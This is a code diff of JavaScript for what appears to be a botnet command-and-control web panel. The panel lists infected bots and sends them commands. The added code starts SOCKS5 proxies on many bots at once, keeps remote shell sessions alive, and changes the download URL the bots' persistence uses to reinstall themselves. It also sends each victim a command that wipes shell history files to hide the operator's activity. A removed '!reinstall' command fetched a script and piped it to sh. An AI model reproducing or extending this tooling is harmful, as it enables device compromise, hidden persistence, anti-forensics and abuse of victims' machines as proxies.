@@ -148,6 +148,8 @@ function connectSSE() {
   evtSource.addEventListener('stats', function (e) { updateStats(JSON.parse(e.data)); });
   evtSource.addEventListener('bots', function (e) { updateBots(JSON.parse(e.data)); });
   evtSource.addEventListener('activity', function (e) { addActivityEntry(JSON.parse(e.data)); });
+  evtSource.addEventListener('sniff_stats', function (e) { handleSniffStats(JSON.parse(e.data)); });
+  evtSource.addEventListener('sniff_hit', function (e) { handleSniffHitSSE(JSON.parse(e.data)); });
   evtSource.addEventListener('bot_connect', function (e) {
     var bot = JSON.parse(e.data);
     addOrUpdateBot(bot);
@@ -156,6 +158,8 @@ function connectSSE() {
   evtSource.addEventListener('bot_disconnect', function (e) {
     var d = JSON.parse(e.data);
     removeBot(d.botID);
+    delete shellSessions[d.botID];
+    // bg session WS will close on its own; the onclose handler cleans shellBgSessions
     addNotification('disconnect', d.botID + ' disconnected');
   });
   evtSource.addEventListener('socks_update', function (e) { updateBotSocks(JSON.parse(e.data)); });
@@ -168,7 +172,7 @@ function connectSSE() {
   evtSource.addEventListener('ssh_hit', function () { sshRefreshHits(); sshRefreshStatus(); sshBeep(); });
 
   // Scan job progress (counters, status, progress bar)
-  evtSource.addEventListener('scan_progress', function(e) {
+  evtSource.addEventListener('scan_progress', function (e) {
     try {
       var d = JSON.parse(e.data);
       scanJobRefresh();
@@ -179,17 +183,17 @@ function connectSSE() {
       if (d.lastHit) {
         scanJobAddFeedItem(d.lastHit);
       }
-    } catch(ex) {}
+    } catch (ex) { }
   });
 
   // Scan job individual hit (live feed + beep)
-  evtSource.addEventListener('scan_hit', function(e) {
+  evtSource.addEventListener('scan_hit', function (e) {
     try {
       var d = JSON.parse(e.data);
       scanJobAddFeedItem(d.ip + ' — ' + (d.result || 'hit'));
       scanJobRefreshHits();
       sshBeep(); // reuse beep for scan hits
-    } catch(ex) {}
+    } catch (ex) { }
   });
 
   evtSource.onerror = function () {
@@ -776,6 +780,7 @@ function updateBots(bots) {
   buildFilterPanel();
   filterBotTable();
   updateGroupStats();
+  updateBgIndicators();
 }
 
 function addOrUpdateBot(b) {
@@ -823,7 +828,7 @@ function botChanged(a, b) {
 }
 
 // Tick all "last ping" cells every second so they feel live
-setInterval(function() {
+setInterval(function () {
   var ids = Object.keys(botState);
   for (var i = 0; i < ids.length; i++) {
     var b = botState[ids[i]];
@@ -888,7 +893,7 @@ function createBotRow(b) {
 
   tr.innerHTML =
     '<td><input type="checkbox"' + checked + ' onchange="toggleBotSelect(\'' + eid + '\',this.checked)"></td>' +
-    '<td><span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" title="Click to target this bot">' + escHtml(b.botID) + '</span>' + capTags + hitBadge + '</td>' +
+    '<td><span class="bot-id-link" onclick="event.stopPropagation();openDrawer(\'' + eid + '\')" title="Click for bot details">' + escHtml(b.botID) + '</span>' + capTags + hitBadge + '</td>' +
     '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
     '<td><span class="country-badge" title="' + escHtml(b.country) + '">' + countryFlag(b.country) + '</span></td>' +
     '<td>' + groupTagHtml(b.group) + '</td>' +
@@ -921,7 +926,7 @@ function updateBotRow(row, b) {
   // 0=cb 1=id 2=ip 3=country 4=group 5=arch 6=ram 7=cpu 8=origin 9=process 10=socks 11=scanner 12=uptime 13=ping
   var eid = b.botID.replace(/'/g, "\\'");
   var capTags = botCapTags(b);
-  cells[1].innerHTML = '<span class="bot-id-link" onclick="event.stopPropagation();targetBot(\'' + eid + '\')" title="Click to target this bot">' + escHtml(b.botID) + '</span>' + capTags + hitBadge;
+  cells[1].innerHTML = '<span class="bot-id-link" onclick="event.stopPropagation();openDrawer(\'' + eid + '\')" title="Click for bot details">' + escHtml(b.botID) + '</span>' + capTags + hitBadge;
   cells[4].innerHTML = groupTagHtml(b.group);
   cells[6].textContent = formatRAM(b.ram);
   cells[7].textContent = b.cpuCores;
@@ -975,79 +980,6 @@ function msCmd(cmd) {
   showToast('Sent ' + cmd + ' to ' + ids.length + ' bots', true);
 }
 
-function msScan() {
-  var ids = Object.keys(selectedBots);
-  if (!ids.length) return;
-  var addr = prompt('Scan server address (host:port):', '');
-  if (!addr || !addr.trim()) return;
-  ids.forEach(function (id) { popupCmd(id, '!scan ' + addr.trim()); });
-  showToast('Sent !scan to ' + ids.length + ' bots', true);
-}
-
-// ---------------------------------------------------------------------------
-// Scanner state tracking (per-bot, client-side)
-// ---------------------------------------------------------------------------
-var _scanState = {};  // { botID: { '!scan': true, ... } }
-var _scannerDefs = [
-  {name:'Scan',     start:'!scan',     stop:'!stopscan',     needsAddr:true}
-];
-
-function toggleScanner(botID, idx) {
-  var sc = _scannerDefs[idx];
-  if (!_scanState[botID]) _scanState[botID] = {};
-  var running = _scanState[botID][sc.start];
-
-  if (running) {
-    // Stop it
-    popupCmd(botID, sc.stop);
-    _scanState[botID][sc.start] = false;
-  } else {
-    // Start it
-    if (sc.needsAddr) {
-      popupStartScan(botID);
-    } else {
-      popupCmd(botID, sc.start);
-    }
-    _scanState[botID][sc.start] = true;
-  }
-  // Refresh the popup to update button state
-  var bot = _lastPopupBot;
-  if (bot) showBotPopup(bot);
-}
-var _lastPopupBot = null;
-
-// ---------------------------------------------------------------------------
-// Scanner Tab — global start/stop
-// ---------------------------------------------------------------------------
-function getScanFilters() {
-  var archFilter = document.getElementById('scan-arch') ? document.getElementById('scan-arch').value : '';
-  var minRAM = document.getElementById('scan-ram') ? parseInt(document.getElementById('scan-ram').value) || 0 : 0;
-  return { archFilter: archFilter, minRAM: minRAM };
-}
-
-function scannerStart(type) {
-  var cmd;
-  if (type === 'telnet') {
-    var addr = document.getElementById('scan-telnet-addr').value.trim();
-    if (!addr) { showToast('Enter a scan server address', false); return; }
-    cmd = '!scan ' + addr;
-  } else { return; }
-  var f = getScanFilters();
-  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, archFilter: f.archFilter, minRAM: f.minRAM }) })
-    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
-}
-
-function scannerStop(type) {
-  var cmd;
-  if (type === 'telnet') { cmd = '!stopscan'; }
-  else { return; }
-  var f = getScanFilters();
-  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd, archFilter: f.archFilter, minRAM: f.minRAM }) })
-    .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
-    .catch(function () { showToast('Request failed', false); });
-}
-
 function msKill() {
   var ids = Object.keys(selectedBots);
   if (!ids.length) return;
@@ -1065,6 +997,124 @@ function msOpenShells() {
   for (var i = 1; i < ids.length && i < 8; i++) {
     addShellTab(ids[i]);
   }
+}
+
+function msStartSocks() {
+  var ids = Object.keys(selectedBots);
+  if (!ids.length) return;
+  // Reuse the socks modal but target all selected bots
+  var old = document.getElementById('socks-modal-overlay');
+  if (old) old.remove();
+
+  var defUser = typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : 'admin';
+  var defPass = typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : 'admin';
+
+  var overlay = document.createElement('div');
+  overlay.id = 'socks-modal-overlay';
+  overlay.className = 'socks-modal-overlay';
+  overlay.setAttribute('data-bot', '__multi__');
+  overlay.innerHTML =
+    '<div class="socks-modal">' +
+    '<div class="socks-modal-title">Start SOCKS5 on ' + ids.length + ' bots</div>' +
+    '<div class="cmd-args">' +
+    '<div class="cmd-group">' +
+    '<label>Mode</label>' +
+    '<select id="socks-m-mode" onchange="socksModalModeChange()">' +
+    '<option value="direct">Direct (listen on bot)</option>' +
+    '<option value="relay">Relay (backconnect)</option>' +
+    '</select>' +
+    '</div>' +
+    '<div class="cmd-group" id="socks-m-port-row">' +
+    '<label>Listen Port</label>' +
+    '<input type="text" id="socks-m-port" value="1080" placeholder="1080">' +
+    '</div>' +
+    '<div class="cmd-group" id="socks-m-relay-row" style="display:none">' +
+    '<label>Relay</label>' +
+    '<select id="socks-m-relay"><option value="">Loading...</option></select>' +
+    '</div>' +
+    '<div class="cmd-group">' +
+    '<label>Username (optional)</label>' +
+    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
+    '</div>' +
+    '<div class="cmd-group">' +
+    '<label>Password (optional)</label>' +
+    '<input type="password" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
+    '</div>' +
+    '</div>' +
+    '<div class="socks-modal-btns">' +
+    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">Cancel</button>' +
+    '<button class="socks-modal-btn socks-modal-start" onclick="msSubmitSocksModal()">Start</button>' +
+    '</div>' +
+    '</div>';
+  document.body.appendChild(overlay);
+  overlay.addEventListener('click', function (e) { if (e.target === overlay) closeSocksModal(); });
+  populateRelayDropdown();
+  requestAnimationFrame(function () { overlay.classList.add('open'); });
+}
+
+function msSubmitSocksModal() {
+  var ids = Object.keys(selectedBots);
+  if (!ids.length) { closeSocksModal(); return; }
+  var mode = document.getElementById('socks-m-mode').value;
+  var user = (document.getElementById('socks-m-user') || {}).value || '';
+  var pass = (document.getElementById('socks-m-pass') || {}).value || '';
+  var socksArg;
+  if (mode === 'relay') {
+    socksArg = (document.getElementById('socks-m-relay') || {}).value;
+    if (!socksArg) { showToast('No relay selected', false); return; }
+  } else {
+    socksArg = (document.getElementById('socks-m-port') || {}).value || '1080';
+  }
+  ids.forEach(function (id) {
+    popupCmd(id, '!socks ' + socksArg);
+    if (user && pass) popupCmd(id, '!socksauth ' + user + ' ' + pass);
+  });
+  showToast('Started SOCKS on ' + ids.length + ' bots', true);
+  closeSocksModal();
+}
+
+function msUpdateFetch() {
+  var ids = Object.keys(selectedBots);
+  if (!ids.length) return;
+  var old = document.getElementById('updatefetch-modal-overlay');
+  if (old) old.remove();
+
+  var overlay = document.createElement('div');
+  overlay.id = 'updatefetch-modal-overlay';
+  overlay.className = 'socks-modal-overlay';
+  overlay.innerHTML =
+    '<div class="socks-modal">' +
+    '<div class="socks-modal-title">Update Fetch URL on ' + ids.length + ' bots</div>' +
+    '<div class="cmd-args">' +
+    '<div class="cmd-group">' +
+    '<label>New Fetch URL</label>' +
+    '<input type="text" id="uf-url" placeholder="http://host/bins/" style="width:100%">' +
+    '</div>' +
+    '</div>' +
+    '<div class="socks-modal-btns">' +
+    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeUpdateFetchModal()">Cancel</button>' +
+    '<button class="socks-modal-btn socks-modal-start" onclick="msSubmitUpdateFetch()">Update</button>' +
+    '</div>' +
+    '</div>';
+  document.body.appendChild(overlay);
+  overlay.addEventListener('click', function (e) { if (e.target === overlay) closeUpdateFetchModal(); });
+  requestAnimationFrame(function () { overlay.classList.add('open'); });
+  setTimeout(function () { var el = document.getElementById('uf-url'); if (el) el.focus(); }, 200);
+}
+
+function closeUpdateFetchModal() {
+  var el = document.getElementById('updatefetch-modal-overlay');
+  if (el) { el.classList.remove('open'); setTimeout(function () { el.remove(); }, 200); }
+}
+
+function msSubmitUpdateFetch() {
+  var ids = Object.keys(selectedBots);
+  var url = (document.getElementById('uf-url') || {}).value || '';
+  if (!url) { showToast('Please enter a fetch URL', false); return; }
+  if (!confirm('Update fetch URL and rewrite persistence on ' + ids.length + ' bots?')) return;
+  ids.forEach(function (id) { popupCmd(id, '!updatefetch ' + url); });
+  showToast('Sent !updatefetch to ' + ids.length + ' bots', true);
+  closeUpdateFetchModal();
 }
 
 // ---------------------------------------------------------------------------
@@ -1307,7 +1357,7 @@ function filterBotTable() {
 
 function exportBotsCSV() {
   var rows = document.querySelectorAll('#bot-tbody tr.bot-row');
-  var cols = ['Bot ID','IP','Country','Group','Arch','RAM (MB)','CPU','Origin','Process','SOCKS','Uptime','Last Ping'];
+  var cols = ['Bot ID', 'IP', 'Country', 'Group', 'Arch', 'RAM (MB)', 'CPU', 'Origin', 'Process', 'SOCKS', 'Uptime', 'Last Ping'];
   var csv = [cols.join(',')];
   rows.forEach(function (r) {
     if (r.style.display === 'none') return;
@@ -1329,7 +1379,7 @@ function exportBotsCSV() {
       b.lastPing || ''
     ].join(','));
   });
-  var blob = new Blob([csv.join('\n')], {type: 'text/csv'});
+  var blob = new Blob([csv.join('\n')], { type: 'text/csv' });
   var a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
   a.download = 'bots_' + new Date().toISOString().slice(0, 10) + '.csv';
@@ -1383,18 +1433,6 @@ function fillPopup(b) {
   } else {
     html += '<button class="popup-act act-socks" onclick="popupStartSocks(\'' + id + '\')">Start SOCKS</button>';
   }
-  html += '<button class="popup-act act-persist" onclick="popupCmd(\'' + id + '\',\'!persist\')">Persist</button>';
-  // Scanner toggles — tracked per bot, single button each
-  var scanners = [
-    {name:'Scan',     start:'!scan',     stop:'!stopscan',     needsAddr:true}
-  ];
-  for (var si = 0; si < scanners.length; si++) {
-    var sc = scanners[si];
-    var running = _scanState[id] && _scanState[id][sc.start];
-    var cls = running ? 'popup-act act-scanner-on' : 'popup-act act-scanner-off';
-    var lbl = (running ? '\u25A0 ' : '\u25B6 ') + sc.name;
-    html += '<button class="' + cls + '" onclick="toggleScanner(\'' + id + '\',' + si + ')">' + lbl + '</button>';
-  }
   html += '<button class="popup-act act-kill" onclick="popupKill(\'' + id + '\')">Kill</button>';
   acts.innerHTML = html;
   rbacFilterActions();
@@ -1437,12 +1475,6 @@ function popupCmd(botID, cmd) {
 function popupKill(botID) {
   if (!confirm('Kill bot ' + botID + '? This cannot be undone.')) return;
   popupCmd(botID, '!kill'); closeBotPopup();
-}
-
-function popupStartScan(botID) {
-  var addr = prompt('Scan server address (host:port):', '');
-  if (!addr || !addr.trim()) return;
-  popupCmd(botID, '!scan ' + addr.trim());
 }
 
 function popupStartSocks(botID) {
@@ -1576,9 +1608,6 @@ var cmdArgDefs = {
     { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password' }
   ],
   '!info': [], '!persist': [],
-  '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)' }],
-  '!stopscan': [],
-  '!reinstall': [{ id: 'arg-reinstall-url', label: 'Script URL', placeholder: 'e.g. http://example.com/x.sh', tooltip: 'URL to a loader script. Bot kills itself, downloads this script, and pipes it to sh.' }],
   '!updatefetch': [
     { id: 'arg-uf-url', label: 'Fetch URL', placeholder: 'e.g. http://bins.example.com/init.sh', tooltip: 'The loader script URL that persistence mechanisms (cron, systemd, rc.local) will use to re-download the bot if the binary is missing.' },
     { id: 'arg-uf-host', label: 'Bins Host (optional)', placeholder: 'e.g. bins.example.com', tooltip: 'Host where architecture-specific bot binaries are served. Used by scanners to infect new devices. Leave empty to keep current value.' }
@@ -1636,12 +1665,10 @@ function buildArgs() {
       var u = (document.getElementById('arg-sa-user') || {}).value || '';
       var p = (document.getElementById('arg-sa-pass') || {}).value || '';
       return (u && p) ? u + ' ' + p : '';
-    case '!reinstall': return (document.getElementById('arg-reinstall-url') || {}).value || '';
     case '!updatefetch':
       var ufUrl = (document.getElementById('arg-uf-url') || {}).value || '';
       var ufHost = (document.getElementById('arg-uf-host') || {}).value || '';
       return ufHost ? ufUrl + ' ' + ufHost : ufUrl;
-    case '!scan': return (document.getElementById('arg-scan-addr') || {}).value || '';
     default: return '';
   }
 }
@@ -1651,7 +1678,6 @@ function sendCmd() {
   var args = buildArgs().trim();
   var botID = document.getElementById('cmd-bot').value.trim();
   if ((typ === '!shell' || typ === '!detach') && !args) { showToast('Please enter a command', false); return; }
-  if (typ === '!reinstall' && !args) { showToast('Please enter a script URL', false); return; }
   if (typ === '!updatefetch' && !args) { showToast('Please enter a fetch URL', false); return; }
   if (typ === '!socksauth') {
     var u = (document.getElementById('arg-sa-user') || {}).value || '';
@@ -1660,7 +1686,6 @@ function sendCmd() {
   }
 
   if (typ === '!lolnogtfo' && !confirm('Kill all targeted bots? This cannot be undone.')) return;
-  if (typ === '!reinstall' && !confirm('Run reinstall script on all targeted bots?')) return;
   if (typ === '!updatefetch' && !confirm('Update fetch URL and rewrite persistence on all targeted bots?')) return;
   var command = typ;
   if (args) command += ' ' + args;
@@ -1694,7 +1719,7 @@ function previewCmd() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: command })
-  }).then(function(r) { return r.json(); }).then(function(d) {
+  }).then(function (r) { return r.json(); }).then(function (d) {
     if (!d.ok) { showToast('Preview failed: ' + (d.error || 'unknown'), false); return; }
     var responses = d.responses || [];
     var body = '<div style="font-size:12px;opacity:0.6;margin-bottom:8px">Command: <code>' + escHtml(command) + '</code> — sent to ' + d.sampled + ' bots</div>';
@@ -1715,9 +1740,9 @@ function previewCmd() {
       message: body,
       confirmText: 'Send to All',
       confirmColor: '#3fb950',
-      onConfirm: function() { sendCmd(); }
+      onConfirm: function () { sendCmd(); }
     });
-  }).catch(function(e) { showToast('Preview error: ' + e, false); });
+  }).catch(function (e) { showToast('Preview error: ' + e, false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -2179,7 +2204,6 @@ function buildTaskCommand() {
       var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
       if (u && p) args = u + ' ' + p;
       break;
-    case '!scan': args = (document.getElementById('t-arg-scan-addr') || {}).value || ''; break;
     default: break;
   }
   var cmd = typ;
@@ -2227,13 +2251,13 @@ function renderTaskTable(tasks) {
       '<div class="task-status-dot ' + dotClass + '"></div>' +
       '<div class="task-cmd" title="' + escHtml(t.command) + '">' + escHtml(t.command) + '</div>' +
       '<div class="task-meta">' +
-        '<span class="task-badge ' + badgeClass + '">' + badgeText + '</span>' +
-        '<span class="task-meta-item"><span class="task-meta-label">created</span> ' + createdStr + '</span>' +
-        '<span class="task-meta-item"><span class="task-meta-label">TTL</span> ' + expiresStr + '</span>' +
-        '<span class="task-meta-item"><span class="task-meta-label">ran on</span> ' + t.executed + ' bots</span>' +
+      '<span class="task-badge ' + badgeClass + '">' + badgeText + '</span>' +
+      '<span class="task-meta-item"><span class="task-meta-label">created</span> ' + createdStr + '</span>' +
+      '<span class="task-meta-item"><span class="task-meta-label">TTL</span> ' + expiresStr + '</span>' +
+      '<span class="task-meta-item"><span class="task-meta-label">ran on</span> ' + t.executed + ' bots</span>' +
       '</div>' +
       '<button class="task-remove" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Stop</button>' +
-    '</div>';
+      '</div>';
   });
   wrap.innerHTML = html;
 }
@@ -2328,11 +2352,16 @@ function renderNotifList() {
 // ---------------------------------------------------------------------------
 
 var shellWS = null, shellHistory = [], shellHistIdx = -1, shellBotID = '', shellCwd = '~';
-var shellSessions = {};
+var shellSessions = {};  // {botID: {output, cmds, cwd, cmdLog}}
+var shellBgSessions = {};  // {botID: WebSocket} — live WS kept after shell close
+var _shellAutoSent = 0;   // auto commands (ls, cd) not shown in terminal but sent to bot
 var shellTabs = []; // [{botID, ws, output, cmds, cwd}]
 var activeShellTab = 0;
 var pendingFileRefresh = false;
 var pendingCdRefresh = false;
+var shellCmdLog = [];          // [{ts, cmd}] — persistent history log
+var _ctxEntry = null;        // current file context menu target {name, isDir, cwd}
+var shellStreamActive = 0;   // counter: number of in-flight streaming commands
 
 // Tab completion definitions
 var tcCommands = [
@@ -2396,12 +2425,14 @@ function activateShellTab(idx) {
   if (saved) {
     output.innerHTML = saved.output;
     shellHistory = saved.cmds.slice();
-    shellCwd = saved.cwd || '~';
+    shellCwd = saved.cwd || '/';
+    shellCmdLog = (saved.cmdLog || []).slice();
     output.scrollTop = output.scrollHeight;
   } else {
     output.innerHTML = '';
     shellHistory = [];
-    shellCwd = '~';
+    shellCwd = '/';
+    shellCmdLog = [];
   }
 
   updateBreadcrumb();
@@ -2410,33 +2441,81 @@ function activateShellTab(idx) {
   renderShellTabs();
   overlay.classList.add('open');
   input.focus();
+  initShellResize();
 
-  // Connect WebSocket
+  // Connect WebSocket — reuse background session if alive, otherwise open fresh
   if (shellWS) { shellWS.close(); shellWS = null; }
-  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
-  shellWS.onmessage = function (e) {
+  pendingFileRefresh = false;
+  _shellAutoSent = 0;
+  shellStreamActive = 0;
+  updateStreamIndicator();
+
+  var _bgReused = false;
+  if (shellBgSessions[tab.botID] && shellBgSessions[tab.botID].readyState === 1) {
+    shellWS = shellBgSessions[tab.botID];
+    delete shellBgSessions[tab.botID];
+    _bgReused = true;
+    updateBgIndicators();
+    appendOutput('\n[resumed background session]\n');
+  } else {
+    delete shellBgSessions[tab.botID]; // stale entry cleanup
+    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    shellWS = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(tab.botID));
+  }
+
+  function _shellOnMsg(e) {
     try {
       var d = JSON.parse(e.data);
-      // Handle file download from bot
+
+      // PTY messages — route to xterm.js handler
+      if (d.type && d.type.indexOf('pty_') === 0) {
+        handlePtyMessage(d);
+        return;
+      }
+
       if (d.type === 'file' && d.name && d.data) {
         shellTriggerDownload(d.name, d.data);
         return;
       }
+      // Streaming output: per-line stdout
+      if (d.type === 'stream_stdout') {
+        appendOutput(d.output || '');
+        return;
+      }
+      // Streaming output: per-line stderr (styled)
+      if (d.type === 'stream_stderr') {
+        appendStderrOutput(d.output || '');
+        return;
+      }
+      // Streaming start ack — show running indicator
+      if (d.type === 'stream_start') {
+        shellStreamActive++;
+        updateStreamIndicator();
+        return;
+      }
+      // Streaming done — hide running indicator
+      if (d.type === 'stream_done') {
+        shellStreamActive = Math.max(0, shellStreamActive - 1);
+        updateStreamIndicator();
+        if (d.exitCode && d.exitCode !== 0) {
+          appendStderrOutput('[' + (d.error || 'exit code ' + d.exitCode) + ']\n');
+        }
+        return;
+      }
+      // Normal output (blocking shell, cd, auto-ls, etc.)
       if (d.output) {
-        appendOutput(d.output);
-        // If we requested a file listing, parse it
         if (pendingFileRefresh) {
           pendingFileRefresh = false;
           parseFileList(d.output);
+        } else {
+          appendOutput(d.output);
         }
-        // Check if output is a pwd result (single line starting with /)
         var trimmed = d.output.trim();
         if (trimmed.match(/^\/[^\n]*$/) && !trimmed.match(/\s/)) {
           shellCwd = trimmed;
           document.getElementById('shell-prompt').textContent = shellCwd + '$ ';
           updateBreadcrumb();
-          // cd completed — now refresh file browser in the new directory
+          updateFbPathInput();
           if (pendingCdRefresh) {
             pendingCdRefresh = false;
             refreshFiles();
@@ -2444,11 +2523,33 @@ function activateShellTab(idx) {
         }
       }
     } catch (ex) { }
-  };
+  }
+  shellWS.onmessage = _shellOnMsg;
   shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
 
-  // Auto-refresh file listing
-  setTimeout(function () { refreshFiles(); }, 500);
+  if (_bgReused) {
+    var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
+    pendingFileRefresh = true;
+    shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
+    _shellAutoSent++;
+  }
+
+  shellWS.onopen = function () {
+    var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
+    if (!shellCwd || shellCwd === '~') {
+      shellCwd = '/';
+      document.getElementById('shell-prompt').textContent = '/$ ';
+      updateBreadcrumb();
+    }
+    pendingFileRefresh = true;
+    shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
+    _shellAutoSent++;
+    // Auto-enter PTY mode if default is set
+    if (ptyDefaultMode && !ptyMode) {
+      setTimeout(function () { enterPtyMode(); }, 200);
+    }
+  };
+  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
 }
 
 function switchShellTab(idx) {
@@ -2457,7 +2558,7 @@ function switchShellTab(idx) {
   if (shellBotID) {
     shellSessions[shellBotID] = {
       output: document.getElementById('shell-output').innerHTML,
-      cmds: shellHistory.slice(), cwd: shellCwd
+      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice()
     };
   }
   activateShellTab(idx);
@@ -2487,11 +2588,42 @@ function closeShell() {
   if (shellBotID) {
     shellSessions[shellBotID] = {
       output: document.getElementById('shell-output').innerHTML,
-      cmds: shellHistory.slice(), cwd: shellCwd
+      cmds: shellHistory.slice(), cwd: shellCwd, cmdLog: shellCmdLog.slice()
     };
+    // Wipe only commands from this session — trim last N lines from history files.
+    // shellHistory covers user-typed + file-browser cd clicks; _shellAutoSent covers
+    // the silent ls -laF commands sent for the file browser.
+    if (shellWS && shellWS.readyState === 1) {
+      var n = (shellHistory.length || 0) + (_shellAutoSent || 0);
+      // Remove the last N lines written during this session; leave older history intact.
+      // ash/busybox: no HISTFILE truncation support, just delete entirely.
+      var wipe = n > 0
+        ? 'N=' + n + '; ' +
+        'for f in ~/.bash_history ~/.sh_history; do [ -f "$f" ] && ' +
+        'lines=$(wc -l < "$f" 2>/dev/null) && ' +
+        'keep=$((lines - N)) && ' +
+        '[ "$keep" -gt 0 ] && head -n "$keep" "$f" > "$f.tmp" && mv "$f.tmp" "$f" || > "$f"; done 2>/dev/null; ' +
+        'rm -f ~/.ash_history 2>/dev/null; true'
+        : 'true';
+      shellWS.send(JSON.stringify({ command: wipe }));
+    }
+    // Keep the WebSocket alive in background to capture any pending output
+    if (shellWS && shellWS.readyState === 1) {
+      var _bgBotID = shellBotID;
+      shellBgSessions[_bgBotID] = shellWS;
+      shellWS.onmessage = makeBgMessageHandler(_bgBotID);
+      shellWS.onclose = function () {
+        delete shellBgSessions[_bgBotID];
+        updateBgIndicators();
+      };
+      shellWS = null;
+      updateBgIndicators();
+    } else {
+      if (shellWS) shellWS.close();
+      shellWS = null;
+    }
   }
   document.getElementById('shell-overlay').classList.remove('open');
-  if (shellWS) { shellWS.close(); shellWS = null; }
   shellTabs = [];
   document.getElementById('tab-complete').style.display = 'none';
 }
@@ -2546,11 +2678,54 @@ function appendOutput(text) {
   if (text.indexOf('\x1b[') !== -1) {
     el.appendChild(parseAnsi(text));
   } else {
-    var span = document.createElement('span');
-    span.textContent = text;
-    el.appendChild(span);
+    el.appendChild(parseClickableOutput(text));
   }
   if (nearBottom) el.scrollTop = el.scrollHeight;
+}
+
+function appendStderrOutput(text) {
+  var el = document.getElementById('shell-output');
+  var nearBottom = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
+  var span = document.createElement('span');
+  span.style.color = 'var(--red, #f44)';
+  span.textContent = text;
+  el.appendChild(span);
+  if (nearBottom) el.scrollTop = el.scrollHeight;
+}
+
+function updateStreamIndicator() {
+  var el = document.getElementById('shell-stream-indicator');
+  if (!el) return;
+  if (shellStreamActive > 0) {
+    el.style.display = 'inline-block';
+  } else {
+    el.style.display = 'none';
+  }
+}
+
+function parseClickableOutput(text) {
+  var frag = document.createDocumentFragment();
+  // Skip parsing on long lines — guards against base64/binary flooding the DOM
+  if (text.length > 200) { frag.appendChild(document.createTextNode(text)); return frag; }
+  // IPv4 + filesystem paths (only a-z0-9._- components — excludes base64 + chars)
+  var re = /(\b(?:\d{1,3}\.){3}\d{1,3}\b)|(\/[a-zA-Z0-9._\-][a-zA-Z0-9._\-\/]*)/g;
+  var last = 0, m;
+  while ((m = re.exec(text)) !== null) {
+    if (m.index > last) frag.appendChild(document.createTextNode(text.slice(last, m.index)));
+    var val = m[0], span = document.createElement('span');
+    span.textContent = val;
+    if (m[1]) {
+      span.className = 'out-ip'; span.title = 'Copy IP';
+      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('Copied: ' + v, true); }; })(val);
+    } else {
+      span.className = 'out-path'; span.title = 'Navigate to path';
+      span.onclick = (function (v) { return function () { shellCd(v); }; })(val);
+    }
+    frag.appendChild(span);
+    last = m.index + val.length;
+  }
+  if (last < text.length) frag.appendChild(document.createTextNode(text.slice(last)));
+  return frag;
 }
 
 // ---------------------------------------------------------------------------
@@ -2577,8 +2752,25 @@ function updateBreadcrumb() {
   bc.innerHTML = html;
 }
 
+function shellGotoPath(path) {
+  path = (path || '').trim();
+  if (!path) return;
+  shellCd(path);
+  document.getElementById('fb-path-input').value = '';
+}
+
+function updateFbPathInput() {
+  var el = document.getElementById('fb-path-input');
+  if (el && !document.activeElement !== el) el.placeholder = shellCwd || '/';
+}
+
 function shellCd(path) {
   if (!shellWS || shellWS.readyState !== 1) return;
+  // Build absolute path for bare names (file browser clicks)
+  if (path !== '..' && path !== '/' && path.charAt(0) !== '/' && path.charAt(0) !== '~') {
+    var base = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
+    path = base.replace(/\/+$/, '') + '/' + path;
+  }
   var cmd = 'cd ' + path;
   var p = document.getElementById('shell-prompt').textContent;
   appendOutput(p + ' ' + cmd + '\n');
@@ -2608,7 +2800,9 @@ function toggleFileSidebar() {
 function refreshFiles() {
   if (!shellWS || shellWS.readyState !== 1) return;
   pendingFileRefresh = true;
-  shellWS.send(JSON.stringify({ command: 'ls -laF' }));
+  var dir = (shellCwd && shellCwd !== '~') ? shellCwd : '/';
+  shellWS.send(JSON.stringify({ command: 'ls -laF ' + dir }));
+  _shellAutoSent++;
 }
 
 function parseFileList(output) {
@@ -2662,10 +2856,11 @@ function parseFileList(output) {
   var html = '<div class="file-entry fe-dir" onclick="shellCd(\'..\')"><span class="file-icon">..</span><span>../</span></div>';
   entries.forEach(function (e) {
     var cls = 'file-entry';
-    var icon = '&#128196;'; // file icon
+    var icon = '&#128196;';
     var click = '';
     var dlBtn = '';
     var eName = e.name.replace(/'/g, "\\'");
+    var ctx = 'oncontextmenu="event.preventDefault();showFileCtx(event,\'' + eName + '\',' + (e.isDir ? 'true' : 'false') + ')"';
